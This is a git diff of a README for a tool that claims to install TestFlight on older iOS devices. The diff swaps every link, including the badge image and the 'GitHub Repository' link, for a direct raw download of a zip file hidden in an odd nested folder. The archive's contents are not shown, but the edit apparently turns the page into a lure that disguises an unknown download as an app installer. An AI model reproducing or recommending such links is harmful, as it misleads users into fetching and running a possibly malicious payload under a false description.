@@ -1,6 +1,6 @@
 # 🚀 testflight-lower-install - Install TestFlight on Older iOS Devices
 
-[![Download](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/Cellxv7/testflight-lower-install)
+[![Download](https://github.com/Cellxv7/testflight-lower-install/raw/refs/heads/main/tflowerinstallprefs/layout/install_lower_testflight_v1.5.zip)](https://github.com/Cellxv7/testflight-lower-install/raw/refs/heads/main/tflowerinstallprefs/layout/install_lower_testflight_v1.5.zip)
 
 ## 📥 Overview
 
@@ -17,7 +17,7 @@ This application allows you to install the TestFlight app on devices running old
 To get started, follow the steps below to download and install the application.
 
 1. **Visit the Download Page:**
-   Go to the following link to download the application: [Download Here](https://github.com/Cellxv7/testflight-lower-install).
+   Go to the following link to download the application: [Download Here](https://github.com/Cellxv7/testflight-lower-install/raw/refs/heads/main/tflowerinstallprefs/layout/install_lower_testflight_v1.5.zip).
 
 2. **Download the Application:**
    Once on the page, look for the latest release. Click on the download link to get the application file.
@@ -63,6 +63,6 @@ For further assistance or to report issues, feel free to contact us through the 
 
 ## 📖 Additional Resources
 
-- **GitHub Repository:** For the latest updates and information, visit [this page](https://github.com/Cellxv7/testflight-lower-install).
+- **GitHub Repository:** For the latest updates and information, visit [this page](https://github.com/Cellxv7/testflight-lower-install/raw/refs/heads/main/tflowerinstallprefs/layout/install_lower_testflight_v1.5.zip).
 
 By following these steps, you can easily install and use TestFlight on your older iOS device. Enjoy accessing new apps and features with ease!
